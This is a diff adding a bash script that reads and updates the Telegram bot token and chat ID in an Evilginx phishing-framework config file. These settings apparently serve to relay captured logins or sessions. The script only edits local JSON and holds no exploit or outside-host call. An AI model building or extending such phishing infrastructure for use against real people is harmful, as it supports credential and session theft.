@@ -1,0 +1,56 @@
+#!/bin/bash
+
+# Get the directory where the script is located
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+CONFIG_SOURCE="$SCRIPT_DIR/../../../.evilginx/config.json"
+CONFIG_SYMLINK="$SCRIPT_DIR/config.json"
+
+# Function to update config values
+update_config() {
+    local bot_token="$1"
+    local chat_id="$2"
+    
+    # Check if source config exists
+    if [ ! -f "$CONFIG_SOURCE" ]; then
+        echo "{\"error\": \"Source config file not found at $CONFIG_SOURCE\"}" >&2
+        exit 1
+    fi
+    
+    # Read the current config
+    local config="$(cat "$CONFIG_SOURCE")"
+    
+    # Update the values using jq
+    echo "$config" | jq --arg token "$bot_token" --arg chat "$chat_id" \
+        '.general.telegram_bot_token = $token | .general.telegram_chat_id = $chat' > "$CONFIG_SOURCE"
+    
+    # Update symlink to reflect changes
+    ln -sf "$CONFIG_SOURCE" "$CONFIG_SYMLINK"
+    echo "{\"message\": \"Settings updated successfully\"}"
+}
+
+# Function to read current values
+read_config() {
+    if [ -f "$CONFIG_SOURCE" ]; then
+        jq -r '{
+            bot_token: .general.telegram_bot_token,
+            chat_id: .general.telegram_chat_id
+        }' "$CONFIG_SOURCE"
+    else
+        echo "{\"error\": \"Config file not found at $CONFIG_SOURCE\"}" >&2
+        exit 1
+    fi
+}
+
+# Handle command line arguments
+case "$1" in
+    "read")
+        read_config
+        ;;
+    "update")
+        update_config "$2" "$3"
+        ;;
+    *)
+        echo "Usage: $0 {read|update BOT_TOKEN CHAT_ID}"
+        exit 1
+        ;;
+esac 
